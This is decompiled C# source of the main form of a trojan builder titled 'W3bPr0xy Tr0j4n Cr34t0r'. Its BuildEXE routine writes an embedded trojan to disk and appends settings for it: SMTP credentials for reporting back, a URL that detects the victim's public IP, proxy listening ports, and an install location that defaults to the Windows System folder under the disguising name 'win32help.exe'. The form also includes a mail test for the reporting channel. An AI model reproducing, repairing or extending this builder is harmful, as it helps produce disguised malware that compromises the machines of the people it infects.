		Label14.set_TextAlign((ContentAlignment)64);
		((TextBoxBase)txtDetectIP).set_BackColor(Color.Black);
		((TextBoxBase)txtDetectIP).set_ForeColor(Color.FromArgb(0, 192, 0));
		TextBox obj31 = txtDetectIP;
		location = new Point(6, 36);
		((Control)obj31).set_Location(location);
		((TextBoxBase)txtDetectIP).set_MaxLength(100);
		((Control)txtDetectIP).set_Name("txtDetectIP");
		TextBox obj32 = txtDetectIP;
		size = new Size(275, 21);
		((Control)obj32).set_Size(size);
		((Control)txtDetectIP).set_TabIndex(2);
		txtDetectIP.set_Text("http://whatismyip.com/automation/n09230945.asp");
		btnExit.ForeColor = Color.Lime;
		btnExit.GlowColor = Color.FromArgb(192, 255, 192);
		btnExit.InnerBorderColor = Color.FromArgb(0, 64, 0);
		GlassButton glassButton = btnExit;
		location = new Point(439, 365);
		((Control)glassButton).set_Location(location);
		GlassButton glassButton2 = btnExit;
		Padding margin = default(Padding);
		((Padding)(ref margin))._002Ector(1);
		((Control)glassButton2).set_Margin(margin);
		((Control)btnExit).set_Name("btnExit");
		btnExit.OuterBorderColor = Color.FromArgb(192, 255, 192);
		btnExit.ShineColor = Color.FromArgb(128, 255, 128);
		GlassButton glassButton3 = btnExit;
		size = new Size(140, 23);
		((Control)glassButton3).set_Size(size);
		((Control)btnExit).set_TabIndex(4);
		((ButtonBase)btnExit).set_Text("&Exit");
		btnGenerate.ForeColor = Color.Lime;
		btnGenerate.GlowColor = Color.FromArgb(192, 255, 192);
		GlassButton glassButton4 = btnGenerate;
		location = new Point(292, 365);
		((Control)glassButton4).set_Location(location);
		GlassButton glassButton5 = btnGenerate;
		((Padding)(ref margin))._002Ector(1);
		((Control)glassButton5).set_Margin(margin);
		((Control)btnGenerate).set_Name("btnGenerate");
		btnGenerate.OuterBorderColor = Color.FromArgb(192, 255, 192);
		btnGenerate.ShineColor = Color.FromArgb(128, 255, 128);
		GlassButton glassButton6 = btnGenerate;
		size = new Size(140, 23);
		((Control)glassButton6).set_Size(size);
		((Control)btnGenerate).set_TabIndex(3);
		((ButtonBase)btnGenerate).set_Text("&Build");
		btnMailTest.FadeOnFocus = true;
		btnMailTest.ForeColor = Color.Lime;
		btnMailTest.GlowColor = Color.FromArgb(192, 255, 192);
		GlassButton glassButton7 = btnMailTest;
		location = new Point(77, 174);
		((Control)glassButton7).set_Location(location);
		GlassButton glassButton8 = btnMailTest;
		((Padding)(ref margin))._002Ector(1);
		((Control)glassButton8).set_Margin(margin);
		((Control)btnMailTest).set_Name("btnMailTest");
		btnMailTest.OuterBorderColor = Color.FromArgb(192, 255, 192);
		btnMailTest.ShineColor = Color.FromArgb(128, 255, 128);
		GlassButton glassButton9 = btnMailTest;
		size = new Size(204, 21);
		((Control)glassButton9).set_Size(size);
		((Control)btnMailTest).set_TabIndex(14);
		((ButtonBase)btnMailTest).set_Text("&Send Mail Test");
		((ButtonBase)lblStatus).set_AutoEllipsis(true);
		((Control)lblStatus).set_Dock((DockStyle)2);
		((Control)lblStatus).set_Enabled(false);
		((Control)lblStatus).set_Font(new Font("Tahoma", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		lblStatus.ForeColor = Color.Silver;
		lblStatus.GlowColor = Color.FromArgb(192, 255, 192);
		GlassButton glassButton10 = lblStatus;
		location = new Point(0, 391);
		((Control)glassButton10).set_Location(location);
		GlassButton glassButton11 = lblStatus;
		((Padding)(ref margin))._002Ector(1);
		((Control)glassButton11).set_Margin(margin);
		((Control)lblStatus).set_Name("lblStatus");
		lblStatus.OuterBorderColor = Color.Black;
		lblStatus.ShineColor = Color.Cyan;
		GlassButton glassButton12 = lblStatus;
		size = new Size(584, 21);
		((Control)glassButton12).set_Size(size);
		((Control)lblStatus).set_TabIndex(0);
		((ButtonBase)lblStatus).set_Text("W3bPr0xy Tr0j4n Cr34t0r v.1.0 Alpha 1");
		((ButtonBase)lblStatus).set_TextAlign((ContentAlignment)16);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)0);
		size = new Size(584, 412);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)btnExit);
		((Control)this).get_Controls().Add((Control)(object)btnGenerate);
		((Control)this).get_Controls().Add((Control)(object)grbSettings);
		((Control)this).get_Controls().Add((Control)(object)grbMail);
		((Control)this).get_Controls().Add((Control)(object)lblStatus);
		((Control)this).set_Font(new Font("Tahoma", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)this).set_ForeColor(Color.Lime);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("frmMain");
		((Form)this).set_Opacity(0.9);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)grbMail).ResumeLayout(false);
		((Control)grbMail).PerformLayout();
		((ISupportInitialize)numTimeout).EndInit();
		((ISupportInitialize)numPort).EndInit();
		((Control)grbSettings).ResumeLayout(false);
		((Control)grbSettings).PerformLayout();
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool ReleaseCapture();

	[DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

	private void ME_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Invalid comparison between Unknown and I4
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 94:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0017;
						case 4:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 5:
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0017:
					num = 3;
					ReleaseCapture();
					break;
					IL_0008:
					num = 2;
					if ((int)e.get_Button() != 1048576)
					{
						goto end_IL_0000_3;
					}
					goto IL_0017;
					end_IL_0000_2:
					break;
				}
				num = 4;
				SendMessage(((Control)this).get_Handle(), 161, 2, 0);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 94;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void BuildEXE(string sPath)
	{
		//IL_0266: Unknown result type (might be due to invalid IL or missing references)
		//IL_0283: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			((ButtonBase)lblStatus).set_Text(DateAndTime.get_Now().ToString() + " Build started..");
			Cursor.set_Current(Cursors.get_WaitCursor());
			Application.DoEvents();
			Thread.Sleep(1000);
			File.WriteAllBytes(sPath, Resources.W3bPrOxy_Tr0j4n_OnClick);
			using (FileStream fileStream = new FileStream(sPath, FileMode.OpenOrCreate))
			{
				using (BinaryWriter binaryWriter = new BinaryWriter(fileStream))
				{
					binaryWriter.Seek(0, SeekOrigin.End);
					binaryWriter.Write("|[START]|");
					binaryWriter.Write("#[MailHost]=" + txtHost.get_Text().Trim() + "#");
					binaryWriter.Write("#[MailUser]=" + txtUser.get_Text().Trim() + "#");
					binaryWriter.Write("#[MailPassword]=" + txtPassword.get_Text().Trim() + "#");
					binaryWriter.Write("#[MailFrom]=" + txtFrom.get_Text().Trim() + "#");
					binaryWriter.Write("#[MailSubject]=" + txtSubject.get_Text().Trim() + "#");
					binaryWriter.Write("#[MailTimeout]=" + numTimeout.get_Value() + "#");
					binaryWriter.Write("#[MailPort]=" + numPort.get_Value() + "#");
					binaryWriter.Write("#[DetectIP]=" + txtDetectIP.get_Text().Trim() + "#");
					binaryWriter.Write("#[ListeningPorts]=" + txtListeningPorts.get_Text().Trim() + "#");
					binaryWriter.Write("#[ExePath]=" + cmbDir.get_Text().Trim() + "#");
					binaryWriter.Write("#[ExeName]=" + txtFileName.get_Text().Trim() + "#");
					binaryWriter.Write("|[END]|");
					binaryWriter.Close();
				}
				fileStream.Close();
			}
			((ButtonBase)lblStatus).set_Text(DateAndTime.get_Now().ToString() + " Build succeeded");
			MessageBox.Show("Trojan build succeeded!", "W3bPr0xy Tr0j4n Cr34t0r v.1.0", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString(), "W3bPr0xy Tr0j4n Cr34t0r v.1.0", (MessageBoxButtons)0, (MessageBoxIcon)16);
			((ButtonBase)lblStatus).set_Text(DateAndTime.get_Now().ToString() + " " + ex2.Message);
			ProjectData.ClearProjectError();
		}
		finally
		{
			Cursor.set_Current(Cursors.get_Default());
		}
	}

	private bool IsValidEmail(string email)
	{
		string pattern = "^[-a-zA-Z0-9][-.a-zA-Z0-9]*@[-.a-zA-Z0-9]+(\\.[-.a-zA-Z0-9]+)*\\.(com|edu|info|gov|int|mil|net|org|biz|name|museum|coop|aero|pro|tv|[a-zA-Z]{2})$";
		Regex regex = new Regex(pattern, RegexOptions.IgnorePatternWhitespace);
		bool flag = false;
		if (string.IsNullOrEmpty(email))
		{
			return false;
		}
		return regex.IsMatch(email);
	}

	private void btnExit_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void btnGenerate_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Invalid comparison between Unknown and I4
		SaveFileDialog val = new SaveFileDialog();
		try
		{
			((FileDialog)val).set_Filter("Executable files (*.exe)|*.exe|All files|*.*");
			((FileDialog)val).set_FileName(txtFileName.get_Text().Trim());
			if ((int)((CommonDialog)val).ShowDialog((IWin32Window)(object)this) == 1)
			{
				BuildEXE(((FileDialog)val).get_FileName());
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void btnMailTest_Click(object sender, EventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_0116: Unknown result type (might be due to invalid IL or missing references)
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		if (!IsValidEmail(txtUser.get_Text()))
		{
			MessageBox.Show("Invalid 'User' (mail)", "W3bPr0xy Tr0j4n Cr34t0r v.1.0", (MessageBoxButtons)0, (MessageBoxIcon)48);
			((Control)txtUser).Focus();
			return;
		}
		if (!IsValidEmail(txtFrom.get_Text()))
		{
			MessageBox.Show("Invalid 'From' (mail)", "W3bPr0xy Tr0j4n Cr34t0r v.1.0", (MessageBoxButtons)0, (MessageBoxIcon)48);
			((Control)txtFrom).Focus();
			return;
		}
		try
		{
			Mail mail = new Mail(txtHost.get_Text().Trim(), txtUser.get_Text().Trim(), txtPassword.get_Text(), Convert.ToInt32(numPort.get_Value()), Convert.ToInt32(numTimeout.get_Value()));
			Cursor.set_Current(Cursors.get_WaitCursor());
			Application.DoEvents();
			if (mail.SendMail(txtFrom.get_Text().Trim(), txtUser.get_Text().Trim(), txtSubject.get_Text().Trim(), "Test mail..\r\nPowered by W3bPr0xy Tr0j4n Cr34t0r v.1.0"))
			{
				MessageBox.Show("Mail test succeeded.", "W3bPr0xy Tr0j4n Cr34t0r v.1.0", (MessageBoxButtons)0, (MessageBoxIcon)64);
			}
			Cursor.set_Current(Cursors.get_Default());
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Cursor.set_Current(Cursors.get_Default());
			MessageBox.Show("Mail test failed.\r\n\r\nDescription: " + ex2.ToString(), "W3bPr0xy Tr0j4n Cr34t0r v.1.0", (MessageBoxButtons)0, (MessageBoxIcon)48);
			ProjectData.ClearProjectError();
		}
	}

	private void frmMain_Load(object sender, EventArgs e)
	{
		//IL_01f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fe: Expected O, but got Unknown
		//IL_0210: Unknown result type (might be due to invalid IL or missing references)
		//IL_021a: Expected O, but got Unknown
		//IL_022c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0236: Expected O, but got Unknown
		//IL_0259: Unknown result type (might be due to invalid IL or missing references)
		//IL_025f: Expected O, but got Unknown
		//IL_0278: Unknown result type (might be due to invalid IL or missing references)
		//IL_0282: Expected O, but got Unknown
		//IL_02be: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c4: Expected O, but got Unknown
		//IL_02dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e7: Expected O, but got Unknown
		int try0000_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		IEnumerator enumerator = default(IEnumerator);
		Control val = default(Control);
		IEnumerator enumerator2 = default(IEnumerator);
		Control val2 = default(Control);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					((Form)this).set_Text("W3bPr0xy Tr0j4n Cr34t0r v.1.0");
					goto IL_000e;
				case 931:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000e;
						case 3:
							goto IL_001c;
						case 4:
							goto IL_002f;
						case 5:
							goto IL_0048;
						case 6:
							goto IL_0061;
						case 7:
							goto IL_007a;
						case 8:
							goto IL_0093;
						case 9:
							goto IL_00ac;
						case 10:
							goto IL_00c6;
						case 11:
							goto IL_00e0;
						case 12:
							goto IL_00fa;
						case 13:
							goto IL_0114;
						case 14:
							goto IL_012e;
						case 15:
							goto IL_0148;
						case 16:
							goto IL_0162;
						case 17:
							goto IL_017c;
						case 18:
							goto IL_0196;
						case 19:
							goto IL_01b0;
						case 20:
							goto IL_01ca;
						case 21:
							goto IL_01de;
						case 22:
							goto IL_01e7;
						case 23:
							goto IL_01fe;
						case 24:
							goto IL_021a;
						case 25:
							goto IL_0236;
						case 26:
							goto IL_025f;
						case 27:
							goto IL_026b;
						case 28:
						case 29:
							goto IL_0282;
						case 30:
							goto IL_029b;
						case 31:
							goto IL_02c4;
						case 32:
							goto IL_02d0;
						case 33:
						case 34:
							goto IL_02e7;
						default:
							goto end_IL_0000;
						case 35:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_02b0:
					if (enumerator.MoveNext())
					{
						val = (Control)enumerator.Current;
						goto IL_02c4;
					}
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
					goto end_IL_0000_2;
					IL_029b:
					num = 30;
					enumerator = ((Control)grbSettings).get_Controls().GetEnumerator();
					goto IL_02b0;
					IL_000e:
					num = 2;
					((Form)this).set_Icon(Resources.icon);
					goto IL_001c;
					IL_001c:
					num = 3;
					((ButtonBase)lblStatus).set_Text("Welcome to W3bPr0xy Tr0j4n Cr34t0r v.1.0");
					goto IL_002f;
					IL_002f:
					num = 4;
					cmbDir.get_Items().Add((object)"%[Program Files]");
					goto IL_0048;
					IL_0048:
					num = 5;
					cmbDir.get_Items().Add((object)"%[Common Program Files]");
					goto IL_0061;
					IL_0061:
					num = 6;
					cmbDir.get_Items().Add((object)"%[Windows Desktop]");
					goto IL_007a;
					IL_007a:
					num = 7;
					cmbDir.get_Items().Add((object)"%[Favorites]");
					goto IL_0093;
					IL_0093:
					num = 8;
					cmbDir.get_Items().Add((object)"%[History]");
					goto IL_00ac;
					IL_00ac:
					num = 9;
					cmbDir.get_Items().Add((object)"%[Personal (My Documents)]");
					goto IL_00c6;
					IL_00c6:
					num = 10;
					cmbDir.get_Items().Add((object)"%[Start Menu's Program]");
					goto IL_00e0;
					IL_00e0:
					num = 11;
					cmbDir.get_Items().Add((object)"%[Recent]");
					goto IL_00fa;
					IL_00fa:
					num = 12;
					cmbDir.get_Items().Add((object)"%[Send To]");
					goto IL_0114;
					IL_0114:
					num = 13;
					cmbDir.get_Items().Add((object)"%[Start Menu]");
					goto IL_012e;
					IL_012e:
					num = 14;
					cmbDir.get_Items().Add((object)"%[Startup]");
					goto IL_0148;
					IL_0148:
					num = 15;
					cmbDir.get_Items().Add((object)"%[Windows System]");
					goto IL_0162;
					IL_0162:
					num = 16;
					cmbDir.get_Items().Add((object)"%[Application Data]");
					goto IL_017c;
					IL_017c:
					num = 17;
					cmbDir.get_Items().Add((object)"%[Common Application]");
					goto IL_0196;
					IL_0196:
					num = 18;
					cmbDir.get_Items().Add((object)"%[Local Application Data]");
					goto IL_01b0;
					IL_01b0:
					num = 19;
					cmbDir.get_Items().Add((object)"%[Cookies]");
					goto IL_01ca;
					IL_01ca:
					num = 20;
					cmbDir.set_Text("%[Windows System]");
					goto IL_01de;
					IL_01de:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_01e7;
					IL_01e7:
					num = 22;
					((Control)this).add_MouseDown(new MouseEventHandler(ME_MouseDown));
					goto IL_01fe;
					IL_01fe:
					num = 23;
					grbMail.add_MouseDown(new MouseEventHandler(ME_MouseDown));
					goto IL_021a;
					IL_021a:
					num = 24;
					grbSettings.add_MouseDown(new MouseEventHandler(ME_MouseDown));
					goto IL_0236;
					IL_0236:
					num = 25;
					enumerator2 = ((Control)grbMail).get_Controls().GetEnumerator();
					goto IL_024b;
					IL_024b:
					if (enumerator2.MoveNext())
					{
						val2 = (Control)enumerator2.Current;
						goto IL_025f;
					}
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
					goto IL_029b;
					IL_02e7:
					num = 34;
					goto IL_02b0;
					IL_025f:
					num = 26;
					if (val2 is Label)
					{
						goto IL_026b;
					}
					goto IL_0282;
					IL_026b:
					num = 27;
					val2.add_MouseDown(new MouseEventHandler(ME_MouseDown));
					goto IL_0282;
					IL_0282:
					num = 29;
					goto IL_024b;
					IL_02c4:
					num = 31;
					if (val is Label)
					{
						goto IL_02d0;
					}
					goto IL_02e7;
					IL_02d0:
					num = 32;
					val.add_MouseDown(new MouseEventHandler(ME_MouseDown));
					goto IL_02e7;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 931;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void txtMAIL_TextChanged(object sender, EventArgs e)
	{
		((Control)btnMailTest).set_Enabled(!string.IsNullOrEmpty(txtHost.get_Text().Trim()) & !string.IsNullOrEmpty(txtUser.get_Text().Trim()) & !string.IsNullOrEmpty(txtFrom.get_Text().Trim()) & !string.IsNullOrEmpty(txtSubject.get_Text().Trim()));
	}

	private void txtDetectIP_Leave(object sender, EventArgs e)
	{
		if (!txtDetectIP.get_Text().StartsWith("http"))
		{
			txtDetectIP.set_Text("http://whatismyip.com/automation/n09230945.asp");
		}
	}

	private void txtFileName_Leave(object sender, EventArgs e)
	{
		if (!txtFileName.get_Text().EndsWith("exe"))
		{
			txtFileName.set_Text("win32help.exe");
		}
	}

	private void txtListeningPorts_Leave(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(txtListeningPorts.get_Text()))
		{
			txtListeningPorts.set_Text("10;21;22;80;81;135;136;411;412;666;1433;1434;2012;2013;3306;3307;3308;3309");
		}
	}
}
